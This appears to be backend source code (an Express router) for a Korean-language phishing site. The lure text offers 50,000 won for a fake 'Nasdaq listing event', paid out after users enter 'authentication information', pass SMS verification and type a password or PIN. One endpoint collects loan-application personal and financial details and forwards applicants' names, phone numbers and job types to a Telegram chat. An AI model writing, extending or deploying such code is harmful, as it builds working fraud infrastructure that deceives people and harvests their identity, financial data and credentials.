import { Router } from "express";
import { db, applicationsTable, settingsTable } from "@workspace/db";
import { desc, eq, count, and, gte, sql } from "drizzle-orm";
import { SubmitApplicationBody } from "@workspace/api-zod";
import { sendTelegramNotification } from "../lib/telegram.js";
import { ObjectStorageService } from "../lib/objectStorage.js";
import { readLocalHeroImage, usesLocalHeroStorage } from "../lib/localHeroImages.js";

const router = Router();

const CONTENT_DEFAULTS: Record<string, string> = {
  event_title:       "나스닥 상장 예정 기념 이벤트",
  existing_reward:   "최대 5만원",
  existing_desc1:    "인증정보 입력만으로",
  existing_desc2:    "본인 계좌 즉시 입금",
  new_reward:        "무조건 5만원",
  new_desc1:         "신규계좌 개설 후",
  new_desc2:         "해당 계좌 즉시 입금",
  form_subtitle:     "본인 확인",
  form_title:        "문자 인증으로\n이벤트 참여",
  form_disclaimer:   "※ 이벤트 내용은 금융기관 사정에 따라 예고 없이 변경되거나 조기 종료될 수 있습니다. 미성년자는 참여 불가합니다.",
  pin_prompt:        "비밀번호를 입력해주세요",
};

async function getSettingPublic(key: string): Promise<string | null> {
  const [row] = await db.select().from(settingsTable).where(eq(settingsTable.key, key));
  return row?.value ?? null;
}

router.get("/site-settings", async (req, res) => {
  try {
    const keys = ["kakao_link", ...Object.keys(CONTENT_DEFAULTS)];
    const rows = await db.select().from(settingsTable);
    const map: Record<string, string | null> = {};
    for (const row of rows) map[row.key] = row.value;

    res.json({
      heroImagePath:  map["hero_image_path"] ?? "",
      heroImageAlt:   map["hero_image_alt"] ?? "",
      kakaoLink:      map["kakao_link"] ?? null,
      eventTitle:     map["event_title"]     ?? CONTENT_DEFAULTS["event_title"],
      existingReward: map["existing_reward"] ?? CONTENT_DEFAULTS["existing_reward"],
      existingDesc1:  map["existing_desc1"]  ?? CONTENT_DEFAULTS["existing_desc1"],
      existingDesc2:  map["existing_desc2"]  ?? CONTENT_DEFAULTS["existing_desc2"],
      newReward:      map["new_reward"]      ?? CONTENT_DEFAULTS["new_reward"],
      newDesc1:       map["new_desc1"]       ?? CONTENT_DEFAULTS["new_desc1"],
      newDesc2:       map["new_desc2"]       ?? CONTENT_DEFAULTS["new_desc2"],
      formSubtitle:   map["form_subtitle"]   ?? CONTENT_DEFAULTS["form_subtitle"],
      formTitle:      map["form_title"]      ?? CONTENT_DEFAULTS["form_title"],
      formDisclaimer: map["form_disclaimer"] ?? CONTENT_DEFAULTS["form_disclaimer"],
      pinPrompt:      map["pin_prompt"]      ?? CONTENT_DEFAULTS["pin_prompt"],
    });
  } catch (err) {
    req.log.error({ err }, "Failed to get site settings");
    res.status(500).json({ error: "Internal error" });
  }
});

router.get("/site/hero-image", async (req, res) => {
  try {
    const path = await getSettingPublic("hero_image_path");
    if (!path) {
      res.sendStatus(404);
      return;
    }
    if (usesLocalHeroStorage()) {
      const image = await readLocalHeroImage(path);
      res.set({
        "Content-Type": image.contentType,
        "Cache-Control": "no-store",
        "X-Content-Type-Options": "nosniff",
      });
      res.send(image.buffer);
      return;
    }
    const file = await new ObjectStorageService().getObjectEntityFile(path);
    const [metadata] = await file.getMetadata();
    res.setHeader("Content-Type", metadata.contentType ?? "application/octet-stream");
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("X-Content-Type-Options", "nosniff");
    file.createReadStream().on("error", (err) => {
      req.log.error({ err }, "Failed to stream hero image");
      if (!res.headersSent) res.sendStatus(500);
      else res.destroy();
    }).pipe(res);
  } catch (err) {
    req.log.error({ err }, "Failed to load hero image");
    res.sendStatus(404);
  }
});

router.post("/applications", async (req, res) => {
  try {
    const body = SubmitApplicationBody.parse(req.body);
    const [application] = await db.insert(applicationsTable).values({
      jobType: body.jobType,
      name: body.name,
      birthYear: body.birthYear ?? null,
      birthMonth: body.birthMonth ?? null,
      birthDay: body.birthDay ?? null,
      phone: body.phone,
      annualIncome: body.annualIncome ?? null,
      workPeriod: body.workPeriod ?? null,
      insurance: body.insurance ?? null,
      existingLoan: body.existingLoan ?? null,
      delinquency: body.delinquency ?? null,
      annualRevenue: body.annualRevenue ?? null,
      businessPeriod: body.businessPeriod ?? null,
    }).returning();

    const jobTypeLabel: Record<string, string> = {
      employee: "직장인",
      business: "사업자",
      housewife: "주부",
      unemployed: "무직",
    };

    await sendTelegramNotification(
      `📋 새 대출 신청이 접수되었습니다!\n\n` +
      `👤 성함: ${application.name}\n` +
      `📞 연락처: ${application.phone}\n` +
      `💼 직업: ${jobTypeLabel[application.jobType] ?? application.jobType}\n` +
      `🕐 신청시간: ${new Date(application.createdAt).toLocaleString("ko-KR")}`
    );

    res.status(201).json(application);
  } catch (err) {
    req.log.error({ err }, "Failed to submit application");
    res.status(400).json({ error: "Invalid request" });
  }
});

export default router;
